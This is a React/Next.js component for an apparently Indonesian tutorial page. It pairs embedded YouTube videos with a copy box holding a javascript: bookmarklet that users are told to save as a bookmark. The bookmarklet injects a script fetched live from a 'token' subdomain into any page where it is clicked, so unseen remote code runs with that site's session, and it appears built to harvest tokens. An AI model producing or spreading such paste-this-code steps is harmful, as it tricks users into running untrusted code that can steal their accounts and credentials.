"use client";
import { useState } from "react";

const videos = [
  {
    title: "Tutorial Android",
    url: "https://www.youtube.com/embed/LbFZY2sgPXo",
  },
  {
    title: "Tutorial Iphone",
    url: "https://www.youtube.com/embed/ja7K42ls3_I",
  },
  {
    title: "Cara Menggunakan dan Fitur Unggulan",
    url: "https://www.youtube.com/embed/wPkCDrujtRQ",
  },
  {
    title: "Solusi Jika Error",
    url: "https://www.youtube.com/embed/VIDEO_ID_4",
  },
];

export default function TutorialSection() {
  const [copied, setCopied] = useState(false);

  const textToCopy = `javascript: (function () {let s = document.createElement("script");s.src = "https://token.olimdipo.my.id/content.js?v=" + Date.now();document.head.appendChild(s);})();`;

  const handleCopy = async () => {
    await navigator.clipboard.writeText(textToCopy);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
      {/* COPY TEXT AREA */}
      <div className="glass-card rounded-2xl p-6 flex flex-col">
        <h3 className="text-lg font-bold text-slate-900 mb-3">Bookmark URL</h3>

        <p className="text-sm text-slate-500 mb-4">Salin teks berikut lalu tempelkan pada kolom url pada bookmark kalian.</p>

        <textarea readOnly value={textToCopy} className="w-full h-40 resize-none rounded-xl border border-slate-200 bg-white/70 p-4 text-sm text-slate-700 focus:outline-none" />

        <button onClick={handleCopy} className="btn-gradient mt-4 text-white font-bold py-3 rounded-xl">
          {copied ? "✔ Berhasil Disalin" : "Salin Teks"}
        </button>
      </div>

      {/* VIDEO AREA */}
      <div className="lg:col-span-2 grid grid-cols-1 md:grid-cols-2 gap-6">
        {videos.map((video, i) => (
          <div key={i} className="glass-card rounded-2xl p-4">
            <div className="aspect-video rounded-xl overflow-hidden mb-3">
              <iframe className="w-full h-full" src={video.url} title={video.title} allowFullScreen />
            </div>
            <h3 className="font-semibold text-slate-800 text-sm">{video.title}</h3>
          </div>
        ))}
      </div>
    </div>
  );
}
